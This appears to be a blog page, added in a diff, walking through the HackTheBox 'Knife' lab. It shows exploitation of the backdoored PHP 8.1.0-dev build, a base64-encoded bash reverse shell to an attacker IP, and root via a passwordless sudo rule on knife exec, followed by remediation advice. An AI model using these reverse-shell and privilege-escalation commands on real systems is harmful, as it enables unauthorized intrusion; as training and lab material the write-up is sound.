@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Knife - HackTheBox writeup</title>
+<meta name="description" content="HackTheBox Knife (Easy, Linux): a PHP 8.1.0-dev backdoor (the User-Agentt header RCE, exploit-db 49933) gives a shell as james, and a passwordless sudo rule on Chef's knife binary is abused with knife exec to spawn a root shell.">
+<link rel="canonical" href="https://sudoanthony.github.io/writeup-knife.html">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="~/sudoanthony">
+<meta property="og:title" content="Knife - HackTheBox (Easy, Linux)">
+<meta property="og:description" content="A PHP 8.1.0-dev backdoor gives a shell as james; a passwordless sudo rule on Chef's knife binary is abused with knife exec to spawn a root shell.">
+<meta property="og:url" content="https://sudoanthony.github.io/writeup-knife.html">
+<meta property="og:image" content="https://sudoanthony.github.io/images/knife-og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Knife - HackTheBox (Easy, Linux)">
+<meta name="twitter:description" content="PHP 8.1.0-dev backdoor to a shell as james, then a passwordless sudo knife rule abused with knife exec for root.">
+<meta name="twitter:image" content="https://sudoanthony.github.io/images/knife-og.png">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<nav class="nav"><div class="wrap">
+  <a class="brand" href="index.html">~/sudoanthony</a>
+  <div class="links">
+    <a href="writeups.html">write-ups</a>
+    <a href="vulns.html">vulns</a>
+    <a href="concepts.html">concepts</a>
+    <a href="tools.html">tools</a>
+    <a href="https://github.com/sudoanthony">github</a>
+  </div>
+</div></nav>
+
+<main class="wrap" style="padding-top:44px">
+
+  <div class="wu-head">
+    <img class="wu-icon" src="images/icons/knife.png" alt="" onerror="this.style.display='none'">
+    <h1>Knife</h1>
+  </div>
+
+  <div class="meta">
+    <span class="badge htb">HackTheBox</span>
+    <span class="badge easy">Easy</span>
+    <span class="badge red-team">red team</span>
+    <span class="sep">|</span>
+    <span>Linux &middot; web</span>
+    <span class="sep">|</span>
+    <span>13 Oct 2026</span>
+  </div>
+
+  <div class="tldr">
+    <span class="lbl">tl;dr</span>
+    <p>Knife has almost nothing to click on. The win comes from fingerprinting the server: an
+    <code>X-Powered-By: PHP/8.1.0-dev</code> header gives away a famously backdoored dev build of PHP, whose
+    backdoor runs commands sent in a <code>User-Agentt</code> header. That lands a shell as <code>james</code>.
+    From there, <code>sudo -l</code> shows james can run Chef's <code>knife</code> binary as root with no
+    password, and since <code>knife</code> runs Ruby, <code>knife exec</code> happily spawns a root shell.</p>
+  </div>
+
+  <div class="tags">
+    <a class="tag" href="vulns.html#php-dev-backdoor">php-dev-backdoor</a>
+    <a class="tag" href="vulns.html#sudo-abuse">sudo-abuse</a>
+    <a class="tag" href="vulns.html#priv-esc">priv-esc</a>
+  </div>
+
+  <p style="margin-top:26px; color:var(--text-2);">
+    A lot of the time on a box you get handed something you know nothing about. These machines are labelled
+    "easy", but if you don't recognise the next step they can feel much harder than that. A big point of the
+    reps is getting used to what is <em>normal</em> and what isn't. Curling the banners of a web server, or
+    just seeing the word <code>dev</code>, should set off the same alarm as finding <code>login</code> or
+    <code>admin</code> somewhere it shouldn't be. Treat every box like a job from a client: investigate and
+    research everything, because any one of those details might be the way in.
+  </p>
+
+  <hr>
+
+  <!-- ==================== 01 ==================== -->
+  <h2><span class="num">01</span>Enumeration</h2>
+
+  <p>Starting with a full port and service scan:</p>
+  <pre><code><span class="p">$</span> nmap -sCV -p- -T4 --min-rate 5000 <span class="o">10.129.54.74</span></code></pre>
+  <figure><img src="images/Knife/knife01.png" alt="nmap showing SSH on 22 and Apache on 80"><figcaption>Only two ports: <strong>22</strong> (OpenSSH 8.2p1) and <strong>80</strong> (Apache 2.4.41), titled "Emergent Medical Idea".</figcaption></figure>
+
+  <p>A small attack surface, so each service gets a close look.</p>
+
+  <p><strong>Port 22 (SSH)</strong> allows no anonymous login - <code>guest</code>, <code>user</code>, and
+  <code>anonymous</code> all fail. Nothing to do here without credentials.</p>
+
+  <p><strong>Port 80 (HTTP)</strong> is a static medical company page. There's nothing to click, no login,
+  no forms. I checked the usual spots anyway: the page source and DevTools (only external CSS/JS from
+  Codepen and Google Fonts), <code>robots.txt</code>, and Wappalyzer.</p>
+  <figure><img src="images/Knife/knife02.png" alt="the Emergent Medical Associates web page"><figcaption>A dead-end brochure site - nothing interactive.</figcaption></figure>
+
+  <p>A directory brute-force turns up nothing hidden either, just the <code>index.php</code> we already see:</p>
+  <pre><code><span class="p">$</span> gobuster dir -u http://<span class="o">10.129.54.74</span> -w &lt;wordlist&gt; -x php,txt,html,js</code></pre>
+  <figure><img src="images/Knife/knife05.png" alt="gobuster finding only index.php"><figcaption>Only <code>index.php</code> - no hidden pages.</figcaption></figure>
+
+  <h3>The header that changes everything</h3>
+
+  <p>When the clicking and crawling comes up empty, go back to basics and read the raw response headers:</p>
+  <pre><code><span class="p">$</span> curl -I http://<span class="o">10.129.54.74</span></code></pre>
+  <figure><img src="images/Knife/knife04.png" alt="curl showing X-Powered-By: PHP/8.1.0-dev"><figcaption>There it is: <code>X-Powered-By: PHP/8.1.0-dev</code>.</figcaption></figure>
+
+  <p>That <code>-dev</code> is the alarm bell. A quick search for "PHP 8.1.0-dev" leads straight to
+  <a href="https://www.exploit-db.com/exploits/49933" target="_blank">exploit-db 49933</a>.</p>
+
+  <div class="note insight">
+    <span class="lbl">the PHP 8.1.0-dev backdoor</span>
+    An early dev build of PHP, <strong>8.1.0-dev</strong>, was released on 28 March 2021 with a
+    <strong>backdoor</strong> slipped into its source. It was caught and removed quickly, but any server
+    still running that exact build is remotely exploitable: the backdoor executes arbitrary commands sent in
+    a <code>User-Agentt</code> header (note the doubled "t"). The exploit script just automates sending that
+    header and reading the output back.
+  </div>
+
+  <hr>
+
+  <!-- ==================== 02 ==================== -->
+  <h2><span class="num">02</span>Foothold - PHP 8.1.0-dev backdoor</h2>
+
+  <p>Run the exploit and give it the target URL. It opens a pseudo-shell that runs whatever you type through
+  the backdoor header:</p>
+  <pre><code><span class="p">$</span> python3 phpdev.py</code></pre>
+  <figure><img src="images/Knife/knife07.png" alt="exploit prompting for the host url"><figcaption>The script asks for the full host URL.</figcaption></figure>
+  <figure><img src="images/Knife/knife08.png" alt="pseudo-shell returning whoami james"><figcaption>Commands execute on the host, running as <code>james</code>.</figcaption></figure>
+
+  <p>This isn't a real shell yet - we're executing commands through the backdoor header, and HTTP headers are
+  limited to Latin-1 characters, which would mangle a reverse-shell one-liner full of symbols. The trick is
+  to <strong>base64-encode</strong> the payload so it travels as plain text, then decode and run it on the
+  target.</p>
+
+  <p>Set up a listener:</p>
+  <pre><code><span class="p">$</span> nc -lvnp 4444</code></pre>
+  <p>Encode a bash reverse shell locally (use your own <code>tun0</code> IP):</p>
+  <pre><code><span class="p">$</span> echo -n 'bash -i &gt;&amp; /dev/tcp/<span class="o">10.10.15.114</span>/4444 0&gt;&amp;1' | base64</code></pre>
+  <p>Then, inside the backdoor pseudo-shell, decode it back and pipe it to bash:</p>
+  <pre><code>$ echo &lt;BASE64_STRING&gt; | base64 -d | bash</code></pre>
+  <figure><img src="images/Knife/knife09.png" alt="reverse shell caught as james and upgraded with python pty"><figcaption>Shell caught as <code>james</code>, then upgraded to a proper TTY with <code>python3 -c 'import pty; pty.spawn("/bin/bash")'</code>.</figcaption></figure>
+
+  <pre><code><span class="p">$</span> cat ~/user.txt   <span class="c"># [redacted]</span></code></pre>
+
+  <hr>
+
+  <!-- ==================== 03 ==================== -->
+  <h2><span class="num">03</span>Privilege escalation - sudo knife</h2>
+
+  <p>With a foothold as james, enumerate for a way up. LinPEAS flags the usual suspects, but the one that
+  matters is the sudo rule:</p>
+  <pre><code><span class="p">$</span> sudo -l</code></pre>
+  <pre><code>User james may run the following commands on knife:
+    (root) NOPASSWD: /usr/bin/knife</code></pre>
+
+  <p>james can run <code>/usr/bin/knife</code> as <strong>root</strong>, with no password. So what is knife?</p>
+  <pre><code><span class="p">$</span> file /usr/bin/knife   <span class="c"># symbolic link to /opt/chef-workstation/bin/knife</span></code></pre>
+  <figure><img src="images/Knife/knife10.png" alt="file knife shows it is Chef's knife binary"><figcaption><code>knife</code> is <strong>Chef</strong>'s command-line tool - and Chef runs on <strong>Ruby</strong>.</figcaption></figure>
+
+  <div class="note insight">
+    <span class="lbl">why a sudo rule on knife is game over</span>
+    This is a textbook <strong>sudo abuse</strong>: if you can run a program as root and that program can be
+    made to execute arbitrary code, you inherit root. <code>knife</code> is built on Ruby and exposes a
+    <code>knife exec</code> subcommand that runs a Ruby script - so you can simply tell it to exec a shell.
+    (This is exactly the kind of entry you'd look up on GTFOBins.)
+  </div>
+
+  <p>The knife help output is enormous (dozens of subcommands for Chef, AWS, Azure, vSphere, and more), and
+  it's easy to rabbit-hole. I poked at <code>knife serve</code> (it just starts a local Chef Zero server on
+  <code>:8889</code>) before landing on the clean answer. Because <code>knife exec</code> runs Ruby as root,
+  one line is all it takes:</p>
+  <pre><code><span class="p">$</span> sudo knife exec -E 'exec "/bin/sh"'</code></pre>
+  <figure><img src="images/Knife/knife16.png" alt="sudo knife exec spawns a root shell"><figcaption><code>whoami</code> returns <strong>root</strong>. The Ruby <code>exec</code> replaced the process with a shell, running as root.</figcaption></figure>
+
+  <pre><code># cat /root/root.txt</code></pre>
+  <figure><img src="images/Knife/knife17.png" alt="root.txt flag (redacted)"><figcaption>Root flag - <code>/root/root.txt</code> [redacted]. Box owned.</figcaption></figure>
+
+  <div class="note">
+    <span class="lbl">also present (alternative path)</span>
+    LinPEAS also flagged a root-owned SUID <code>pkexec</code> at an older version - the box is also
+    vulnerable to <strong>CVE-2021-4034 (PwnKit)</strong>, which would root it too. The intended and cleaner
+    route is the sudo <code>knife</code> rule above.
+  </div>
+
+  <hr>
+
+  <!-- ==================== 04 ==================== -->
+  <h2><span class="num">04</span>Root cause &amp; remediation</h2>
+  <table style="width:100%; border-collapse:collapse; font-size:14.5px; margin:6px 0 8px">
+    <tbody>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text); width:40%"><strong>Backdoored PHP build in production</strong><br><span style="color:var(--text-4);font-size:13px">PHP 8.1.0-dev / exploit-db 49933</span></td>
+        <td style="padding:11px 0; color:var(--text-3)">Never run pre-release/dev builds on an internet-facing server. Pin to patched stable releases, track advisories, and verify package integrity so a tampered build can't ship.</td>
+      </tr>
+      <tr style="border-bottom:1px solid var(--border)">
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Version disclosure in headers</strong></td>
+        <td style="padding:11px 0; color:var(--text-3)">Suppress <code>X-Powered-By</code> and detailed <code>Server</code> banners (<code>expose_php = Off</code>). It won't fix a bug, but it stops handing attackers the exact fingerprint for free.</td>
+      </tr>
+      <tr>
+        <td style="padding:11px 12px 11px 0; color:var(--text)"><strong>Over-broad passwordless sudo</strong><br><span style="color:var(--text-4);font-size:13px">NOPASSWD on an interpreter-backed binary</span></td>
+        <td style="padding:11px 0; color:var(--text-3)">Treat any sudo rule on a program that can run code (knife, ruby, python, find, vim...) as equivalent to full root. Scope sudo to specific, non-shelling commands, and keep admin tooling off user accounts.</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <hr>
+
+  <!-- ==================== 05 ==================== -->
+  <h2><span class="num">05</span>Takeaways</h2>
+  <p>Knife is a lesson in fingerprinting. The whole box hinges on one header you only see if you bother to
+  <code>curl -I</code> after the web page comes up empty. When the obvious enumeration is dry, the move isn't
+  to give up, it's to look closer at what the server is quietly telling you about itself.</p>
+  <p>The privesc is the other half of the lesson, and it's a pattern worth memorising: <code>sudo -l</code>
+  is always an early check, and a passwordless sudo rule on <em>anything that can execute code</em> is a
+  straight line to root. When you see an unfamiliar binary there, the two questions are "what is it" (here,
+  <code>file</code> showed Chef/Ruby) and "can it run a shell" (here, <code>knife exec</code>). GTFOBins
+  exists to answer the second one fast.</p>
+
+  <p style="margin-top:32px">
+    <a href="writeups.html">&larr; all write-ups</a> &nbsp;&middot;&nbsp;
+    <a href="vulns.html">techniques used &rarr;</a>
+  </p>
+
+</main>
+
+<footer class="foot"><div class="wrap" style="display:flex;gap:18px;flex-wrap:wrap">
+  <a href="index.html">home</a>
+  <a href="writeups.html">write-ups</a>
+  <a href="vulns.html">vulns</a>
+  <a href="https://github.com/sudoanthony">github</a>
+</div></footer>
+
+<script src="writeup-toc.js"></script>
+<script src="lightbox.js"></script>
+</body>
+</html>
